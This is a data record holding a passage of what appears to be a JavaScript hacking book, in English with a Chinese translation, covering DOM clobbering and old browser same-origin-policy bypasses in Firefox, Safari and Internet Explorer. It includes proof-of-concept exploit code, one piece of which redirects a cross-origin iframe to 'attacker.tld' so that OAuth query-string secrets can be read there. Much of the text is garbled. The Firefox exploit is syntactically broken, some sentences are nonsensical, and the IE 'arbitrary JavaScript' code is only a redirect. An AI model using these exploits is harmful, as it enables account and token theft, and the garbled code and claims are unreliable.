    # Clobbering document.getElementById()


    This is a technique I found recently where you can actually clobber the results
    of a document.getElementById() call. If you have an element with the id "x" and
    another element with the same id in most circumstances the first element is returned
    by getElementById(). However, I discovered if you use an <html> or <body> element
    you can change the order of the DOM and elements will merge the duplicate tags
    which causes getElementById() to return the <html> or <body> tag depending on
    which one you use:


    ```

    <div id="x"></div>

    <body id="x">

    <script>

    alert(document.getElementById(''x''))

    </script>

    ```


    This can be exploited when a site is protected by CSP and you have a HTML injection
    that occurs after all the elements you wish to exploit. Using this technique you
    can clobber existing nodes and change the results of getElementById() to use your
    element and possibly gain XSS depending on what the site does. This finest whilst
    a well known site where we learned using a div that was invisible at the start
    of the DOM tree near the body tag and they were using this to control a CDN domain
    that was used in a service worker script then they use an importScript() call
    inside the service worker.


    # Clobbering document.querySelector()


    The same technique can be used to clobber the results of document.querySelector(),
    if a site uses it to find the first element with a certain class name the DOM
    will be reordered and the injected <html> or <body> element will be return instead:


    ```

    <div class="x"></div>

    <body class="x">

    <script>

    alert(document.querySelector(''.x''))

    </script>

    ```


    # Summary


    We covered all sorts of interesting things in this chapter. We found different
    ways of getting the window object from a DOM node. Then we looked at the scoping
    of DOM events and how each event has access to not only the element scope but
    also document scope. We finished off with a section on DOM clobbering and explained
    the possible attacks and we learned how difficult it is to write a filter that
    traverses the DOM safely.'
- md: "## Chapter five - Browser exploits\n\n## Introduction\n\nWe can't have a book\
    \ on JavaScript hacking without a chapter on browser exploits right? In this chapter\
    \ I'll discuss the various browser exploits I've found over the years. I've been\
    \ hacking browsers (mostly in my spare time) for over 15 years. In that time I've\
    \ managed to find a SOP (same origin policy) bypass or infiltrate in every major\
    \ browser engine.\n\nBrowser hacking is a very niche area of research but it is\
    \ super fun and you will learn a tremendous amount that you can use in other areas.\
    \ This section won't be in chronological order when I found the bug; instead I'll\
    \ start with the simple bugs and lead up to the more complicated SOP bypass.\n\
    \n## Firefox incorrect handling of cross origin URLs\n\nThis bug was super simple\
    \ and I was surprised that Mozilla's automated tests didn't catch it. I found\
    \ this one when I was testing cross origin windows. I was creating new windows\
    \ and inspecting cross origin objects by looking at the browser console or the\
    \ Hackvertor inspector. The idea was to get a reference to a new window after\
    \ calling \"window.open\" and inspecting that object and see if any data was leaking\
    \ that shouldn't.\n\nWhen you call window.open it's return value is the new window\
    \ object, this is different from the normal window object that you used to. A\
    \ lot of properties are unavailable and throw exceptions you try to read them.\
    \ The reasons for this are clear: if you opened a window to a different origin\
    \ and the window object allowed you to read all the properties you could steal\
    \ data from any website that could result in every account you now compromised.\n\
    \nThe exploit was embarrassingly simple, you opened a new window, waited five\
    \ seconds and attempted to read the location object. Normally an exception would\
    \ be thrown on Firefox but they allowed you to read it. When I first found the\
    \ bug I thought it was one of the RegExp methods that the problem but it turned\
    \ out that you could just read the toString() method of the location object:\n\
    \n```html\n<script>\n  function poc() {\n    var win = window.open('https://twitter.com/lists/',\
    \ 'newWin', 'width=200,height=200');\n    setTimeout(function(){\n      alert('Hello\
    \ '+https://twitter.com/[//]++').exec(win.location[1]);\n    }, 5000);\n  }\n\
    </script>\n<input type=button value=\"Firefox knows\" onclick=\"poc()\">\n```\n\
    \nThe above proof of concept opened a new window to twitter.com/lists which caused\
    \ a redirection to a personalised UL. The second waited 5 seconds then attempted\
    \ to read the location object and used a regex to get the twitter username. It\
    \ would show an alert box and identify you.\n\n## Safari assignments to origin\
    \ hostnames\n\nBack in the day hacking browsers was much easier. This Safari bug\
    \ demonstrates this. It involves setting the hostname of a cross origin location\
    \ object. The problem with that is Safari the query string and hash is really\
    \ bad for security since it might contain sensitive information. If this was found\
    \ today the most likely target would be OAuth tokens. To exploit this bug you\
    \ had to use a new window or iframe, wait for it to load and then set the hostname\
    \ and then the attacker's domain could read the query parameters or hash.\n\n\
    ```html\n<script>\n  function poc(iframe) {\n    var win = iframe.contentWindow;\n\
    \    setTimeout(function(){\n      win.location.hostname='attacker.tld'\n    },\
    \ 5000);\n  }\n</script>\n<iframe src=\"https://oauth.example.com\" onload=\"\
    poc(this)\"></iframe>\n```\n\nThe above example loads an iframe that would then\
    \ perform some sort of authentication and store sensitive data in the query string.\
    \ When the page is loaded after redirection on the target site the poc() function\
    \ is called which gets a reference to the iframe and the content window that refers\
    \ to the cross origin of the iframe. After five seconds, the attacker changes\
    \ the hostname of the iframe to point to the attacker’s domain. The attacker then\
    \ simply reads location.search on their domain to steal the secrets.\n\n```html\n\
    <script>\nvar contents = location.search//contains the query string secrets\n\
    </script>\n```\n\nYou can no longer do this in modern browsers; they sensibly\
    \ prevent read/write access to the host and hostname properties.\n\n## Internet\
    \ Explorer full SOP bypass\n\nI found this bug whilst contracting for Microsoft\
    \ testing various IE features. I love this bug because it's so simple the impact\
    \ is great. Using this bug you could execute arbitrary JavaScript on any domain.\
    \ This involves windows and iframes again shock horror. Are you sensing a theme\
    \ here? What happened when IE was leaking a origin?\n\nHere is how to exploit\
    \ it:\n- Visit a page with an iframe\n- Observe that you can set the name of the\
    \ iframe\n- Attempt to navigate to a different origin\n- Use the iframe to access\
    \ document.domain\n\n```html\n<script>\nwindow.location.href = \"attacker.com\"\
    ;\n</script>\n```\n\nThe above code allows you to execute arbitrary JavaScript\
    \ on any domain."
  mdcn: "\n## 第五章 - 浏览器漏洞\n\n## 引言\n\n没有关于浏览器漏洞的章节，就不可能一本 JavaScript 黑客书籍，对吧？在本章中，我将讨论多年来发现的各种浏览器漏洞。我破解浏览器（大多是在业余时间）已经超过15年。在此期间，我成功在每个主流浏览器引擎中发现了\
    \ SOP（同源策略）的绕过或渗透漏洞。\n\n本节不会按照我发现漏洞的时间顺序排列；相反，我将从简单的漏洞开始，引向更复杂的 SOP 绕过。\n\n##\
    \ Firefox 对跨源 URL 处理不当\n\n这个漏洞非常简单，我很惊讶 Mozilla 的自动化测试没有捕获它。我是在测试跨源窗口时发现这一个。当时我正在创建新窗口，并通过查看浏览器控制台或\
    \ Hackvertor 检查器来检查跨源对象。其思路是在调用 `window.open` 后获取新窗口的引用并检查该对象，看看是否有任何不该泄露的数据泄露。\n\
    \n当你调用 `window.open` 时，它的返回值是新窗口对象，这与你以前使用的窗口对象不同。许多属性是不可用的，且当你尝试读取它们时会抛出异常。其原因显而易见：如果你打开了一个指向不同源的窗口，而窗口对象允许你读取所有属性，你就可以从任何网站窃取数据，这会导致你现在的每一个账户都被破解。\n\
    \n该漏洞的利用简单得令人脸：你打开一个新窗口，等待五秒，然后尝试读取 `location` 对象。通常在 Firefox 上会抛出异常，但他们允许你读取它。当我第一次发现这个漏洞时，我以为是\
    \ RegExp 的某个方法出了问题，但结果证明你只需要读取 `location` 对象的 `toString()` 方法：\n\n```html\n<script>\n\
    \  function poc() {\n    var win = window.open('https://twitter.com/lists/', 'newWin',\
    \ 'width=200,height=200');\n    setTimeout(function(){\n      alert('Hello '+https://twitter.com/[//]++').exec(win.location[1]);\n\
    \    }, 5000);\n  }\n</script>\n<input type=button value=\"Firefox knows\" onclick=\"\
    poc()\">\n```\n\n上面的概念证明（PoC）打开了一个指向 twitter.com/lists 的新窗口，导致重定向到一个个性化的 URL。第二个部分等待五秒，然后尝试读取\
    \ `location` 对象，并使用正则表达式获取 twitter 用户名。它会显示一个警告框并识别你的身份。\n\n## Safari 对源主机名（hostname）的赋值\n\
    \n以前破解浏览器要容易得多。这个 Safari 漏洞就证明了这一点。它涉及设置跨源 location 对象的 hostname。问题在于 Safari 对查询字符串和哈希（hash）的安全处理非常糟糕，因为它们可能包含敏感信息。如果在今天被发现，最大的目标可能是\
    \ OAuth 令牌。要利用此漏洞，你需要使用新窗口或 iframe，等待它加载，然后设置 hostname，之后攻击者的域名就可以读取查询参数或哈希值。\n\
    \n```html\n<script>\n  function poc(iframe) {\n    var win = iframe.contentWindow;\n\
    \    setTimeout(function(){\n      win.location.hostname='attacker.tld'\n    },\
    \ 5000);\n  }\n</script>\n<iframe src=\"https://oauth.example.com\" onload=\"\
    poc(this)\"></iframe>\n```\n\n上面的示例加载了一个 iframe，该 iframe 将执行某种身份验证并将敏感数据存储在查询字符串中。当页面在目标网站重定向后加载时，`poc()`\
    \ 函数被调用，它获取 iframe 的引用以及指向 iframe 跨源内容的 contentWindow。五秒后，攻击者更改 iframe 的 hostname\
    \ 指向攻击者的域名。然后，攻击者只需在自己的域名上读取 `location.search` 即可窃秘密。\n\n```html\n<script>\nvar\
    \ contents = location.search//contains the query string secrets\n</script>\n```\n\
    \n在现代浏览器中你无法再这样做；它们明智地阻止了对 host 和 hostname 属性的读写访问。\n\n## Internet Explorer 完整的\
    \ SOP 绕过\n\n我在为微软承包测试各种 IE 功能时发现这个漏洞的。我喜欢这个漏洞，因为它如此简单却影响巨大。使用这个漏洞你可以在任何域上执行任意\
    \ JavaScript。这再次涉及到窗口和 iframe，令人震惊吧。你感觉到其中的某种规律了吗？当 IE 泄露源时发生了什么？\n\n以下是利用方法：\n\
    - 访问带有 iframe 的页面\n- 观察到你可以设置 iframe 的 name\n- 尝试导航到不同的源\n- 使用 iframe 访问 `document.domain`\n\
    \n```html\n<script>\nwindow.location.href = \"attacker.com\";\n</script>\n```\n\
    \n上面的代码允许你在任何域上执行任意 JavaScript。\n"
